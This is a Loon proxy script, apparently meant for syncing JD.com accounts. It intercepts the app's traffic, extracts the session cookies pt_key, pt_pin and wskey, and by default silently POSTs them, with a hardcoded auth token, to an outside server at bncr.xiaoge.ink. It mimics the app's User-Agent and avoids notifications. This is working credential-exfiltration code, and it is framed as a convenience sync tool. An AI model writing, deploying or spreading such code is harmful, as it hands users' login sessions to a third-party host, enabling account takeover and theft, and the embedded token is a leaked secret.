/**
 * Loon http-request script: 京东凭据提取 → Bncr 静默同步
 *
 * 抓取来源（两条规则，内容自动识别，无需区分）：
 *   ^https?:\/\/api\.m\.jd\.com\/   → pt_key + pt_pin（basicConfig 等接口 Cookie 头）
 *   ^https?:\/\/sh\.jd\.com\/d      → wskey（登录票据，可能不含 pin）
 *
 * 片段拼装：
 *   pin 与 wskey 常出现在不同请求里。脚本把 pin 记忆到本地（12 小时有效），
 *   遇到只有 wskey 的请求时自动回填，拼成 pin=xxx;wskey=xxx; 再上报。
 *
 * 去重（关键，避免弹窗/请求风暴）：
 *   以 pin 为维度记录「最近一次上报成功的凭据指纹」。
 *   凭据没变 → 本地直接放行，0 弹窗、0 外发、0 延迟。
 *   只有首次捕获或凭据刷新时才上报；上报失败不写指纹，下一次请求自然重试（无需重试循环）。
 *
 * 参数（argument）：
 *   silent=true/false  默认 true 完全静默；false 时仅在凭据变更并上报成功时弹窗 1 次
 *   upload=on/off      默认 on
 *
 * @author XiaoGe-LiBai
 * @license MIT
 */

const BNCR_ENDPOINT = "https://bncr.xiaoge.ink/api/Doraemon/loginCallback_receive";
const BNCR_AUTH_TOKEN = "96358b36fc0769de2c8373d5e3582bb9";

const PIN_TTL_MS = 12 * 60 * 60 * 1000; // pin 记忆有效期
const STORE_PIN = "jd_loon_pin";        // {pin, raw, ts}
const STORE_PTKEY_PREFIX = "jd_loon_ptkey_"; // 每账号最近一次成功上报的 pt_key
const STORE_WSKEY_PREFIX = "jd_loon_wskey_"; // 每账号最近一次成功上报的 wskey

(function () {
  try {
    if (!$request || $request.method === "OPTIONS") {
      return $done({});
    }

    const headers = $request.headers || {};
    const args = parseArgs(typeof $argument === "string" ? $argument : "");
    const isSilent = (args.silent || "true").toLowerCase() !== "false";
    const isUploadEnabled = (args.upload || "on").toLowerCase() !== "off";

    // 1. 聚合 Cookie（兼容 HTTP/2 拆分成多个 cookie 头）
    const cookie = collectCookie(headers);
    if (!cookie) {
      return $done({});
    }

    // 2. 提取片段
    const ptKey = pick(cookie, "pt_key");
    const wskey = pick(cookie, "wskey");
    const rawPin = pick(cookie, "pt_pin") || pick(cookie, "pin") || pick(cookie, "pwdt_id");

    // 3. pin 记忆：命中即刷新，未命中则回填最近一次（供 sh.jd.com 这类无 pin 请求配对）
    let pin = rawPin ? decodePin(rawPin) : "";
    if (pin) {
      $persistentStore.write(JSON.stringify({ pin: pin, raw: rawPin, ts: Date.now() }), STORE_PIN);
    } else {
      const recalled = recallPin();
      pin = recalled.pin;
      if (recalled.raw) {
        // 回填时保留原始的 pt_pin 写法，用于 pt_key 形态
        return handle(pin, recalled.raw, ptKey, wskey, { isSilent, isUploadEnabled });
      }
    }
    if (!pin) {
      return $done({});
    }

    return handle(pin, rawPin, ptKey, wskey, { isSilent, isUploadEnabled });

  } catch (err) {
    console.log(`❌ [京东凭据] 脚本异常: ${(err && err.message) || err}`);
    $done({});
  }
})();

/**
 * 组装并上报
 */
function handle(pin, rawPin, ptKey, wskey, opts) {
  // 没有任何凭据片段则放行
  if (!ptKey && !wskey) {
    return $done({});
  }

  // 4. 组装最终凭据：优先 pt_key 形态（登录.js 可直接使用），退回 wskey 形态
  const fullCk = ptKey
    ? `pt_key=${ptKey}; pt_pin=${rawPin || pin};`
    : `pin=${encodeURIComponent(pin)};wskey=${wskey};`;

  // 5. 去重：pt_key 与 wskey 各自独立记指纹，避免互相覆盖导致重复上报
  const ptKeyStore = STORE_PTKEY_PREFIX + pin;
  const wskeyStore = STORE_WSKEY_PREFIX + pin;

  const ptKeyChanged = Boolean(ptKey && ptKey !== ($persistentStore.read(ptKeyStore) || ""));
  const wskeyChanged = Boolean(wskey && wskey !== ($persistentStore.read(wskeyStore) || ""));

  if (!ptKeyChanged && !wskeyChanged) {
    // 凭据未变：本地直接放行，0 弹窗、0 外发、0 延迟
    return $done({});
  }

  const changed = [];
  if (ptKey) changed.push("pt_key");
  if (wskey) changed.push("wskey");

  console.log("================== [京东凭据捕获] ==================");
  console.log(`账号 PIN : ${pin}`);
  console.log(`变更类型 : ${changed.join(" + ")}`);
  console.log(`凭据内容 : ${fullCk}`);
  console.log("====================================================");

  if (!opts.isUploadEnabled) {
    if (ptKey) $persistentStore.write(ptKey, ptKeyStore);
    if (wskey) $persistentStore.write(wskey, wskeyStore);
    console.log("ℹ️ upload=off，已跳过外发");
    return $done({});
  }

  // 6. 静默外发
  const payload = {
    wskey: wskey || "",
    pin: pin,
    full_ck: fullCk,
    name: pin,
    source: "loon-plugin",
    callback_id: BNCR_AUTH_TOKEN
  };

  console.log(`→ 上报 ${BNCR_ENDPOINT}`);

  $httpClient.post(
    {
      url: BNCR_ENDPOINT,
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "User-Agent": resolveUserAgent()
      },
      body: JSON.stringify(payload),
      timeout: 10000
    },
    function (error, response, data) {
      try {
        if (error) {
          console.log(`❌ 上报失败(网络): ${error} — 未写入指纹，下次请求自动重试`);
        } else {
          const status = response ? (response.status || response.statusCode) : 0;
          let res = {};
          try {
            res = JSON.parse(data || "{}");
          } catch (e) {
            res = {};
          }

          if (status === 200 && (res.code === 0 || res.code === 200)) {
            // 上报成功才记指纹（按类型分开记，失败则下次请求自然重试）
            if (ptKey) $persistentStore.write(ptKey, ptKeyStore);
            if (wskey) $persistentStore.write(wskey, wskeyStore);
            console.log(`✅ 上报成功: ${res.msg || "ok"} (${res.triggered || "-"})`);

            if (!opts.isSilent) {
              $notification.post(
                "🎉 京东凭据已同步",
                `${pin} (${changed.join("+")})`,
                "已发送至对接服务器，点击可复制",
                { clipboard: fullCk }
              );
            }
          } else {
            console.log(`❌ 上报失败: HTTP ${status} ${data} — 未写入指纹，下次请求自动重试`);
          }
        }
      } catch (cbErr) {
        console.log(`❌ 回调异常: ${(cbErr && cbErr.message) || cbErr}`);
      } finally {
        $done({});
      }
    }
  );
}

/**
 * 读取 pin 记忆
 */
function recallPin() {
  const raw = $persistentStore.read(STORE_PIN);
  if (!raw) return { pin: "", raw: "" };
  try {
    const data = JSON.parse(raw);
    if (Date.now() - Number(data.ts || 0) > PIN_TTL_MS) return { pin: "", raw: "" };
    return { pin: String(data.pin || ""), raw: String(data.raw || "") };
  } catch (e) {
    return { pin: "", raw: "" };
  }
}

/**
 * pin 解码（非编码值原样返回）
 */
function decodePin(value) {
  try {
    return decodeURIComponent(value);
  } catch (e) {
    return value;
  }
}

/**
 * 聚合所有 cookie 头（兼容 HTTP/2 分片与数组形式）
 */
function collectCookie(headers) {
  if (!headers || typeof headers !== "object") return "";
  const parts = [];
  Object.keys(headers).forEach(function (name) {
    const lower = name.toLowerCase();
    if (lower === "cookie" || lower.indexOf("cookie#") === 0) {
      const value = headers[name];
      if (Array.isArray(value)) {
        value.forEach(function (v) {
          if (v) parts.push(String(v).trim());
        });
      } else if (value) {
        parts.push(String(value).trim());
      }
    }
  });
  return parts.filter(Boolean).join("; ");
}

/**
 * 取 cookie 字段值
 */
function pick(cookie, name) {
  const m = String(cookie).match(new RegExp("(?:^|;\\s*)" + name + "=([^;]+)"));
  return m ? m[1].trim() : "";
}

/**
 * 参数解析
 */
function parseArgs(str) {
  if (!str) return {};
  return str.split("&").reduce(function (acc, cur) {
    if (!cur) return acc;
    const idx = cur.indexOf("=");
    const key = (idx >= 0 ? cur.slice(0, idx) : cur).trim();
    const val = idx >= 0 ? cur.slice(idx + 1) : "";
    acc[key] = decodeURIComponent(val || "");
    return acc;
  }, {});
}

/**
 * 动态 UA：优先复用京东 App 原生请求 UA，兜底标准 iOS Safari UA
 */
function resolveUserAgent() {
  try {
    const headers = ($request && $request.headers) || {};
    for (const key of Object.keys(headers)) {
      if (key.toLowerCase() === "user-agent") {
        const value = headers[key];
        if (typeof value === "string" && value.trim()) return value.trim();
      }
    }
  } catch (e) {
    // 忽略，走兜底
  }
  return "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148";
}
